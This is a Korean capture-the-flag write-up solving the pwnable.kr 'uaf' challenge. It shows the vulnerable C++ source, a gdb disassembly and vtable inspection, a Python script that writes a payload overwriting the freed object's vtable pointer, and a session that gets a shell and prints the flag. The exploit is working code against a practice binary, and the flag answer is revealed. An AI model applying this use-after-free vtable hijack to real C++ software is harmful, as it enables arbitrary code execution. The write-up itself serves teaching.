# uaf - 8 pt

```text
Mommy, what is Use After Free bug?

ssh uaf@pwnable.kr -p2222 (pw:guest)
```

## 소스코드를 보자

```cpp
#include <fcntl.h>
#include <iostream>
#include <cstring>
#include <cstdlib>
#include <unistd.h>
using namespace std;

class Human{
private:
        virtual void give_shell(){
                system("/bin/sh");
        }
protected:
        int age;
        string name;
public:
        virtual void introduce(){
                cout << "My name is " << name << endl;
                cout << "I am " << age << " years old" << endl;
        }
};

class Man: public Human{
public:
        Man(string name, int age){
                this->name = name;
                this->age = age;
        }
        virtual void introduce(){
                Human::introduce();
                cout << "I am a nice guy!" << endl;
        }
};

class Woman: public Human{
public:
        Woman(string name, int age){
                this->name = name;
                this->age = age;
        }
        virtual void introduce(){
                Human::introduce();
                cout << "I am a cute girl!" << endl;
        }
};

int main(int argc, char* argv[]){
        Human* m = new Man("Jack", 25);
        Human* w = new Woman("Jill", 21);

        size_t len;
        char* data;
        unsigned int op;
        while(1){
                cout << "1. use\n2. after\n3. free\n";
                cin >> op;

                switch(op){
                        case 1:
                                m->introduce();
                                w->introduce();
                                break;
                        case 2:
                                len = atoi(argv[1]);
                                data = new char[len];
                                read(open(argv[2], O_RDONLY), data, len);
                                cout << "your data is allocated" << endl;
                                break;
                        case 3:
                                delete m;
                                delete w;
                                break;
                        default:
                                break;
                }
        }

        return 0;
}
```

## VTable Overwrite

어쨌든 우리의 목표는 `virtual void give_shell()` 함수를 실행해 높은 권한의 쉘을 가져오는 것일것 같다.

근데 그걸 어떻게 할까...?

아직 잘은 모르겠지만, `read`함수로 힙에 데이터를 집어 넣을 때, 객체에 할당된 VTable을 변조시켜 `introduce`함수의 주소를 `give_shell`함수의 주소로 변조시킨다면...? 되지 않을까?

그래서 어떻게 해볼꺼냐면

1. `free` 루틴으로 가서 일단 m, w 객체를 해제 한다.
2. `after` 루틴으로 가서 m 객체 만큼의 사이즈를 가진 `char` 배열을 만들고, m 객체 처럼 안에 값을 비슷하게 꾸며준다. 이때 VTable을 조작한다.
3. `use` 루틴으로 가서 m 객체를 사용한다. 이때 m 객체는...?

## 디버깅 하면서 흐름을 파악하자

```c
Dump of assembler code for function main:
   0x0000000000400ec4 <+0>:     push   rbp
   0x0000000000400ec5 <+1>:     mov    rbp,rsp
   0x0000000000400ec8 <+4>:     push   r12
   0x0000000000400eca <+6>:     push   rbx
   0x0000000000400ecb <+7>:     sub    rsp,0x50
   0x0000000000400ecf <+11>:    mov    DWORD PTR [rbp-0x54],edi

   0x0000000000400ed2 <+14>:    mov    QWORD PTR [rbp-0x60],rsi
   0x0000000000400ed6 <+18>:    lea    rax,[rbp-0x12]
   0x0000000000400eda <+22>:    mov    rdi,rax
   0x0000000000400edd <+25>:    call   0x400d70 <_ZNSaIcEC1Ev@plt>
   0x0000000000400ee2 <+30>:    lea    rdx,[rbp-0x12]
   0x0000000000400ee6 <+34>:    lea    rax,[rbp-0x50]
   0x0000000000400eea <+38>:    mov    esi,0x4014f0     -> 0x4014f0: "Jack"
   0x0000000000400eef <+43>:    mov    rdi,rax
   0x0000000000400ef2 <+46>:    call   0x400d10 <_ZNSsC1EPKcRKSaIcE@plt>
   0x0000000000400ef7 <+51>:    lea    r12,[rbp-0x50]
   0x0000000000400efb <+55>:    mov    edi,0x18
   0x0000000000400f00 <+60>:    call   0x400d90 <_Znwm@plt>
   0x0000000000400f05 <+65>:    mov    rbx,rax
   0x0000000000400f08 <+68>:    mov    edx,0x19         -> 0x19 = 25(10)
   0x0000000000400f0d <+73>:    mov    rsi,r12
   0x0000000000400f10 <+76>:    mov    rdi,rbx
   0x0000000000400f13 <+79>:    call   0x401264 <_ZN3ManC2ESsi>

   0x0000000000400f18 <+84>:    mov    QWORD PTR [rbp-0x38],rbx
   0x0000000000400f1c <+88>:    lea    rax,[rbp-0x50]
   0x0000000000400f20 <+92>:    mov    rdi,rax
   0x0000000000400f23 <+95>:    call   0x400d00 <_ZNSsD1Ev@plt>
   0x0000000000400f28 <+100>:   lea    rax,[rbp-0x12]
   0x0000000000400f2c <+104>:   mov    rdi,rax
   0x0000000000400f2f <+107>:   call   0x400d40 <_ZNSaIcED1Ev@plt>
   0x0000000000400f34 <+112>:   lea    rax,[rbp-0x11]
   0x0000000000400f38 <+116>:   mov    rdi,rax
   0x0000000000400f3b <+119>:   call   0x400d70 <_ZNSaIcEC1Ev@plt>
   0x0000000000400f40 <+124>:   lea    rdx,[rbp-0x11]
   0x0000000000400f44 <+128>:   lea    rax,[rbp-0x40]
   0x0000000000400f48 <+132>:   mov    esi,0x4014f5     -> 0x4014f5: "Jill"
   0x0000000000400f4d <+137>:   mov    rdi,rax
   0x0000000000400f50 <+140>:   call   0x400d10 <_ZNSsC1EPKcRKSaIcE@plt>
   0x0000000000400f55 <+145>:   lea    r12,[rbp-0x40]
   0x0000000000400f59 <+149>:   mov    edi,0x18
   0x0000000000400f5e <+154>:   call   0x400d90 <_Znwm@plt>
   0x0000000000400f63 <+159>:   mov    rbx,rax
   0x0000000000400f66 <+162>:   mov    edx,0x15         -> 0x15 = 21(10)
   0x0000000000400f6b <+167>:   mov    rsi,r12
   0x0000000000400f6e <+170>:   mov    rdi,rbx
   0x0000000000400f71 <+173>:   call   0x401308 <_ZN5WomanC2ESsi>

   0x0000000000400f76 <+178>:   mov    QWORD PTR [rbp-0x30],rbx
   0x0000000000400f7a <+182>:   lea    rax,[rbp-0x40]
   0x0000000000400f7e <+186>:   mov    rdi,rax
   0x0000000000400f81 <+189>:   call   0x400d00 <_ZNSsD1Ev@plt>
   0x0000000000400f86 <+194>:   lea    rax,[rbp-0x11]
   0x0000000000400f8a <+198>:   mov    rdi,rax
   0x0000000000400f8d <+201>:   call   0x400d40 <_ZNSaIcED1Ev@plt>

   0x0000000000400f92 <+206>:   mov    esi,0x4014fa     -> 0x4014fa: "1. use\n2. after\n3. free\n"
   0x0000000000400f97 <+211>:   mov    edi,0x602260
   0x0000000000400f9c <+216>:   call   0x400cf0 <_ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc@plt>
   0x0000000000400fa1 <+221>:   lea    rax,[rbp-0x18]
   0x0000000000400fa5 <+225>:   mov    rsi,rax
   0x0000000000400fa8 <+228>:   mov    edi,0x6020e0
   0x0000000000400fad <+233>:   call   0x400dd0 <_ZNSirsERj@plt>
   0x0000000000400fb2 <+238>:   mov    eax,DWORD PTR [rbp-0x18]
   0x0000000000400fb5 <+241>:   cmp    eax,0x2
   0x0000000000400fb8 <+244>:   je     0x401000 <main+316>
   0x0000000000400fba <+246>:   cmp    eax,0x3
   0x0000000000400fbd <+249>:   je     0x401076 <main+434>
   0x0000000000400fc3 <+255>:   cmp    eax,0x1
   0x0000000000400fc6 <+258>:   je     0x400fcd <main+265>
   0x0000000000400fc8 <+260>:   jmp    0x4010a9 <main+485>

   0x0000000000400fcd <+265>:   mov    rax,QWORD PTR [rbp-0x38]
   0x0000000000400fd1 <+269>:   mov    rax,QWORD PTR [rax]
   0x0000000000400fd4 <+272>:   add    rax,0x8
   0x0000000000400fd8 <+276>:   mov    rdx,QWORD PTR [rax]
   0x0000000000400fdb <+279>:   mov    rax,QWORD PTR [rbp-0x38]
   0x0000000000400fdf <+283>:   mov    rdi,rax
   0x0000000000400fe2 <+286>:   call   rdx
   0x0000000000400fe4 <+288>:   mov    rax,QWORD PTR [rbp-0x30]
   0x0000000000400fe8 <+292>:   mov    rax,QWORD PTR [rax]
   0x0000000000400feb <+295>:   add    rax,0x8
   0x0000000000400fef <+299>:   mov    rdx,QWORD PTR [rax]
   0x0000000000400ff2 <+302>:   mov    rax,QWORD PTR [rbp-0x30]
   0x0000000000400ff6 <+306>:   mov    rdi,rax
   0x0000000000400ff9 <+309>:   call   rdx
   0x0000000000400ffb <+311>:   jmp    0x4010a9 <main+485>

   0x0000000000401000 <+316>:   mov    rax,QWORD PTR [rbp-0x60]
   0x0000000000401004 <+320>:   add    rax,0x8
   0x0000000000401008 <+324>:   mov    rax,QWORD PTR [rax]
   0x000000000040100b <+327>:   mov    rdi,rax
   0x000000000040100e <+330>:   call   0x400d20 <atoi@plt>
   0x0000000000401013 <+335>:   cdqe
   0x0000000000401015 <+337>:   mov    QWORD PTR [rbp-0x28],rax
   0x0000000000401019 <+341>:   mov    rax,QWORD PTR [rbp-0x28]
   0x000000000040101d <+345>:   mov    rdi,rax
   0x0000000000401020 <+348>:   call   0x400c70 <_Znam@plt>
   0x0000000000401025 <+353>:   mov    QWORD PTR [rbp-0x20],rax
   0x0000000000401029 <+357>:   mov    rax,QWORD PTR [rbp-0x60]
   0x000000000040102d <+361>:   add    rax,0x10
   0x0000000000401031 <+365>:   mov    rax,QWORD PTR [rax]
   0x0000000000401034 <+368>:   mov    esi,0x0
   0x0000000000401039 <+373>:   mov    rdi,rax
   0x000000000040103c <+376>:   mov    eax,0x0
   0x0000000000401041 <+381>:   call   0x400dc0 <open@plt>
   0x0000000000401046 <+386>:   mov    rdx,QWORD PTR [rbp-0x28]
   0x000000000040104a <+390>:   mov    rcx,QWORD PTR [rbp-0x20]
   0x000000000040104e <+394>:   mov    rsi,rcx
   0x0000000000401051 <+397>:   mov    edi,eax
   0x0000000000401053 <+399>:   call   0x400ca0 <read@plt>
   0x0000000000401058 <+404>:   mov    esi,0x401513     -> 0x401513: "your data is allocated"
   0x000000000040105d <+409>:   mov    edi,0x602260
   0x0000000000401062 <+414>:   call   0x400cf0 <_ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc@plt>
   0x0000000000401067 <+419>:   mov    esi,0x400d60
   0x000000000040106c <+424>:   mov    rdi,rax
   0x000000000040106f <+427>:   call   0x400d50 <_ZNSolsEPFRSoS_E@plt>
   0x0000000000401074 <+432>:   jmp    0x4010a9 <main+485>

   0x0000000000401076 <+434>:   mov    rbx,QWORD PTR [rbp-0x38]
   0x000000000040107a <+438>:   test   rbx,rbx
   0x000000000040107d <+441>:   je     0x40108f <main+459>
   0x000000000040107f <+443>:   mov    rdi,rbx
   0x0000000000401082 <+446>:   call   0x40123a <_ZN5HumanD2Ev>
   0x0000000000401087 <+451>:   mov    rdi,rbx
   0x000000000040108a <+454>:   call   0x400c80 <_ZdlPv@plt>
   0x000000000040108f <+459>:   mov    rbx,QWORD PTR [rbp-0x30]
   0x0000000000401093 <+463>:   test   rbx,rbx
   0x0000000000401096 <+466>:   je     0x4010a8 <main+484>
   0x0000000000401098 <+468>:   mov    rdi,rbx
   0x000000000040109b <+471>:   call   0x40123a <_ZN5HumanD2Ev>
   0x00000000004010a0 <+476>:   mov    rdi,rbx
   0x00000000004010a3 <+479>:   call   0x400c80 <_ZdlPv@plt>
   0x00000000004010a8 <+484>:   nop
   0x00000000004010a9 <+485>:   jmp    0x400f92 <main+206>

   0x00000000004010ae <+490>:   mov    r12,rax
   0x00000000004010b1 <+493>:   mov    rdi,rbx
   0x00000000004010b4 <+496>:   call   0x400c80 <_ZdlPv@plt>
   0x00000000004010b9 <+501>:   mov    rbx,r12
   0x00000000004010bc <+504>:   jmp    0x4010c1 <main+509>
   0x00000000004010be <+506>:   mov    rbx,rax
   0x00000000004010c1 <+509>:   lea    rax,[rbp-0x50]
   0x00000000004010c5 <+513>:   mov    rdi,rax
   0x00000000004010c8 <+516>:   call   0x400d00 <_ZNSsD1Ev@plt>
   0x00000000004010cd <+521>:   jmp    0x4010d2 <main+526>
   0x00000000004010cf <+523>:   mov    rbx,rax
   0x00000000004010d2 <+526>:   lea    rax,[rbp-0x12]
   0x00000000004010d6 <+530>:   mov    rdi,rax
   0x00000000004010d9 <+533>:   call   0x400d40 <_ZNSaIcED1Ev@plt>
   0x00000000004010de <+538>:   mov    rax,rbx
   0x00000000004010e1 <+541>:   mov    rdi,rax
   0x00000000004010e4 <+544>:   call   0x400da0 <_Unwind_Resume@plt>
   0x00000000004010e9 <+549>:   mov    r12,rax
   0x00000000004010ec <+552>:   mov    rdi,rbx
   0x00000000004010ef <+555>:   call   0x400c80 <_ZdlPv@plt>
   0x00000000004010f4 <+560>:   mov    rbx,r12
   0x00000000004010f7 <+563>:   jmp    0x4010fc <main+568>
   0x00000000004010f9 <+565>:   mov    rbx,rax
   0x00000000004010fc <+568>:   lea    rax,[rbp-0x40]
   0x0000000000401100 <+572>:   mov    rdi,rax
   0x0000000000401103 <+575>:   call   0x400d00 <_ZNSsD1Ev@plt>
   0x0000000000401108 <+580>:   jmp    0x40110d <main+585>
   0x000000000040110a <+582>:   mov    rbx,rax
   0x000000000040110d <+585>:   lea    rax,[rbp-0x11]
   0x0000000000401111 <+589>:   mov    rdi,rax
   0x0000000000401114 <+592>:   call   0x400d40 <_ZNSaIcED1Ev@plt>
   0x0000000000401119 <+597>:   mov    rax,rbx
   0x000000000040111c <+600>:   mov    rdi,rax
   0x000000000040111f <+603>:   call   0x400da0 <_Unwind_Resume@plt>
End of assembler dump.
```

아래 스택은 `switch`문의 `case 1`에 막 들어갔을 때의 스택 상황이다.

```c
Breakpoint 1, 0x0000000000400fcd in main ()
(gdb) x/x $rbp-0x38             -> 객체 m을 가르키는 포인터
0x7fff861c0898: 0x025b8c50
(gdb) x/x 0x25b8c50             -> Vtable을 가르키는 포인터
0x25b8c50:      0x00401570
(gdb) x/x 0x401570              -> Vtable Func Pointer #1, give_shell()
0x401570 <_ZTV3Man+16>: 0x0040117a
(gdb) x/x 0x401570+8            -> Vtable Func Pointer #2, introduce()
0x401578 <_ZTV3Man+24>: 0x004012d2
(gdb) disas 0x40117a
Dump of assembler code for function _ZN5Human10give_shellEv:
   0x000000000040117a <+0>:     push   rbp
   0x000000000040117b <+1>:     mov    rbp,rsp
   0x000000000040117e <+4>:     sub    rsp,0x10
   0x0000000000401182 <+8>:     mov    QWORD PTR [rbp-0x8],rdi
   0x0000000000401186 <+12>:    mov    edi,0x4014a8
   0x000000000040118b <+17>:    call   0x400cc0 <system@plt>
   0x0000000000401190 <+22>:    leave
   0x0000000000401191 <+23>:    ret
End of assembler dump.
(gdb) disas 0x4012d2
Dump of assembler code for function _ZN3Man9introduceEv:
   0x00000000004012d2 <+0>:     push   rbp
   0x00000000004012d3 <+1>:     mov    rbp,rsp
   0x00000000004012d6 <+4>:     sub    rsp,0x10
   0x00000000004012da <+8>:     mov    QWORD PTR [rbp-0x8],rdi
   0x00000000004012de <+12>:    mov    rax,QWORD PTR [rbp-0x8]
   0x00000000004012e2 <+16>:    mov    rdi,rax
   0x00000000004012e5 <+19>:    call   0x401192 <_ZN5Human9introduceEv>
   0x00000000004012ea <+24>:    mov    esi,0x4014cd
   0x00000000004012ef <+29>:    mov    edi,0x602260
   0x00000000004012f4 <+34>:    call   0x400cf0 <_ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc@plt>
   0x00000000004012f9 <+39>:    mov    esi,0x400d60
   0x00000000004012fe <+44>:    mov    rdi,rax
   0x0000000000401301 <+47>:    call   0x400d50 <_ZNSolsEPFRSoS_E@plt>
   0x0000000000401306 <+52>:    leave
   0x0000000000401307 <+53>:    ret
End of assembler dump.
```

## 스택 모양

```c
|     Human* m      |     [rbp-0x38]
|     Human* w      |     [rbp-0x30]
|     size_t len    |     [rbp-0x28]
|     char* data    |     [rbp-0x20]
|  unsigned int op  |     [rbp-0x18]
```

## 존나 조쿤ㅋ

삽입할 데이터 생성

```c
uaf@ubuntu:~$ cat /tmp/lueo_uaf/uaf.py
payload = '\x68\x15\x40\x00\x00\x00\x00\x00'+'A'*16
f = open('/tmp/lueo_uaf/uaf', 'wb')
f.write(payload)
f.close()
uaf@ubuntu:~$ hexdump /tmp/lueo_uaf/uaf
0000000 1568 0040 0000 0000 4141 4141 4141 4141
0000010 4141 4141 4141 4141
0000018
```

한번의 free, 그리고 2번의 after 루틴을 거치고 use 루틴을 하면 변조된 Vtable로 들어가 쉘을 실행하게 된다.

```c
uaf@ubuntu:~$ ./uaf 24 /tmp/lueo_uaf/uaf
1. use
2. after
3. free
1
My name is Jack
I am 25 years old
I am a nice guy!
My name is Jill
I am 21 years old
I am a cute girl!
1. use
2. after
3. free
3
1. use
2. after
3. free
2
your data is allocated
1. use
2. after
3. free
2
your data is allocated
1. use
2. after
3. free
1
$ ls
flag  uaf  uaf.cpp
$ cat flag
yay_f1ag_aft3r_pwning
```

ㅋㅋㅋㅋㅋㅋㅋㅋ... 이건 나중에 블로그 포스팅할때 써먹어야징